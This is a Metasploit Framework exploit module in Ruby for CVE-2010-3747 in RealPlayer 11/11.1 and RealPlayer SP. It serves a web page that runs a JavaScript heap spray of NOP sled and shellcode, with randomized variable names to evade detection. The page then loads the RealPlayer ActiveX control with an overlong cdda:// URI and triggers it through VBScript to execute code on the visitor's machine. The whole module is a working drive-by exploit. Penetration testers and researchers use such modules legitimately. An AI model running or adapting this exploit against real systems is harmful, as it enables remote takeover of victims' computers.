##
# $Id: realplayer_cdda_uri.rb 12009 2011-03-17 15:42:28Z bannedit $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'RealNetworks RealPlayer CDDA URI Initialization Vulnerability',
            'Description'    => %q{
                    This module exploits a initialization flaw within RealPlayer 11/11.1 and
                RealPlayer SP 1.0 - 1.1.4. An abnormally long CDDA URI causes an object
                initialization failure. However, this failure is improperly handled and
                uninitialized memory executed.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'bannedit',
                    'sinn3r'
                ],
            'Version'        => '$Revision: 12009 $',
            'References'     =>
                [
                    [ 'CVE', '2010-3747' ],
                    [ 'OSVDB', '68673'],
                    [ 'BID', '44144' ],
                    [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-210/'],
                    [ 'URL', 'http://service.real.com/realplayer/security/10152010_player/en/']
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00",
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'RealPlayer SP 1.0 - 1.1.4 Universal',     { 'Ret' => 0x21212121 } ],
                    [ 'RealPlayer 11.0 - 11.1 Universal',        { 'Ret' => 0x21212121 } ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Nov 15 2010',
            'DefaultTarget'  => 0))
    end
 
    def on_request_uri(cli, request)
        # Re-generate the payload
        return if ((p = regenerate_payload(cli)) == nil)
 
        mytarget = target
 
        # the ret slide gets executed via call [esi+45b]
        retslide = [mytarget.ret].pack('V') * 750
        cdda_uri = "cdda://" +  retslide
 
        # Encode the shellcode
        shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
        nops = make_nops(8)
        nop_sled = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))
 
        # Randomize Javascript variables
        var_blocks    = rand_text_alpha(rand(6)+3)
        var_shellcode = rand_text_alpha(rand(6)+3)
        var_index     = rand_text_alpha(rand(6)+3)
        var_nopsled   = rand_text_alpha(rand(6)+3)
        spray_func    = rand_text_alpha(rand(6)+3)
        obj_id        = rand_text_alpha(rand(6)+3)
        html = <<-EOS
<html>
<head>
<script>
function #{spray_func}() {
    #{var_blocks} = new Array();
    var #{var_shellcode} = unescape("#{shellcode}");
    var #{var_nopsled} = unescape("#{nop_sled}");
    do { #{var_nopsled} += #{var_nopsled} } while (#{var_nopsled}.length < 8200);
        for (#{var_index}=0; #{var_index} < 19000; #{var_index}++)
            #{var_blocks}[#{var_index}] = #{var_nopsled} + #{var_shellcode};
    }
#{spray_func}();
</script>
</head>
<object id=#{obj_id} classid='clsid:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA' width=0 height=0>
<param name="CONTROLS" value="ControlPanel">
<param name="src" value="#{cdda_uri}">
</object>
<script language="VBScript">
#{obj_id}.DoPlay
</script>
</html>
EOS
        print_status("Sending #{self.name} HTML to #{cli.peerhost}:#{cli.peerport}")
        send_response(cli, html, { 'Content-Type' => 'text/html' })
    end
end
